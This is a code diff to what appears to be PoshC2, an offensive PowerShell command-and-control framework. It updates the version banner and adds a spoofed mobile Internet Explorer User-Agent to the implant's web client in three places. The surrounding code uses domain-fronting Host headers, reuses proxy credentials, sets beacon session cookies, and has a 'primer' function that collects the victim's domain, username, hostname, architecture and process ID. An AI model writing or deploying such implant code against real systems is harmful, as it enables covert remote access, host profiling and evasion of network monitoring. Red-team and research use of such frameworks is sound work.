@@ -62,7 +62,7 @@ function Implant-Handler
             Write-Host -Object "|   |  Y Y  \  |_> >  |__/ __ \|   |  \  |  \___ \ " -ForegroundColor Green
             Write-Host -Object "|___|__|_|  /   __/|____(____  /___|  /__| /____  >" -ForegroundColor Green
             Write-Host -Object "          \/|__|             \/     \/          \/ " -ForegroundColor Green
-            Write-Host "============== v2.6 www.PoshC2.co.uk ==============" -ForegroundColor Green
+            Write-Host "============== v2.7 www.PoshC2.co.uk ==============" -ForegroundColor Green
             Write-Host "===================================================" `n -ForegroundColor Green
 
             foreach ($implant in $dbresults) 
@@ -278,6 +278,7 @@ $wc.UseDefaultCredentials = $true;
 $wc.Proxy.Credentials = $wc.Credentials;
 $h="'+$domainfrontheader+'"
 if ($h) {$wc.Headers.Add("Host",$h)}
+$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
 if ($cookie) {
 $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
 } $wc }
@@ -339,6 +340,7 @@ $proxyurl = "'+$proxyurl+'"
 $wc = New-Object System.Net.WebClient;  
 $h="'+$domainfrontheader+'"
 if ($h) {$wc.Headers.Add("Host",$h)}
+$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
 if ($proxyurl) {
 $wp = New-Object System.Net.WebProxy($proxyurl,$true); 
 $wc.Proxy = $wp;
@@ -390,6 +392,7 @@ $wc.UseDefaultCredentials = $true;
 $wc.Proxy.Credentials = $wc.Credentials;
 if ($cookie) {
 $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie")
+$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)")
 } $wc }
 function primer {
 $pre = [System.Text.Encoding]::Unicode.GetBytes("$env:userdomain\$env:username;$env:username;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid")
